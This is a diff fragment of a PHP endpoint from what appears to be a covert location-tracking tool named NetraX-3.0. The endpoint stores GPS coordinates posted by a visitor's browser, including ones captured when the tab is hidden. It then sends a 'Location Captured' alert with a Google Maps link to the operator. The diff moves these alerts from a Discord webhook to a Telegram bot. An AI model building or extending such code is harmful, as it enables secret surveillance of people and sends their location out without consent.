@@ -3,9 +3,9 @@ header('Content-Type: application/json; charset=UTF-8');
 header('X-Content-Type-Options: nosniff');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
-/* ── Discord Webhook Integration ────────────────────────────── */
-if (!defined('DISCORD_WEBHOOK_URL')) {
-    require_once __DIR__ . '/../core/discord_webhook.php';
+/* ── Telegram Webhook Integration ────────────────────────────── */
+if (!defined('TELEGRAM_BOT_TOKEN') || !defined('TELEGRAM_CHAT_ID')) {
+    require_once __DIR__ . '/../core/telegram_webhook.php';
 }
 
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
@@ -124,10 +124,10 @@ if ($written === false || $written < strlen($data)) {
 file_put_contents($data_dir . '/.flag_location', $basename);
 file_put_contents('php://stderr', "[NetraX-3.0] Location saved ({$source}): {$individual_file}\n");
 
-/* ── Discord Notification: GPS Location Captured ── */
+/* ── Telegram Notification: GPS Location Captured ── */
 $mapsUrl = 'https://www.google.com/maps/place/' . $latText . ',' . $lonText;
 $sourceLabel = $source === 'page_hide' ? '📍 Location Captured (Tab Hidden)' : '📍 GPS Location Captured';
-sendDiscordAlert(
+sendTelegramAlert(
     $sourceLabel,
     [
         'Source'      => $source,
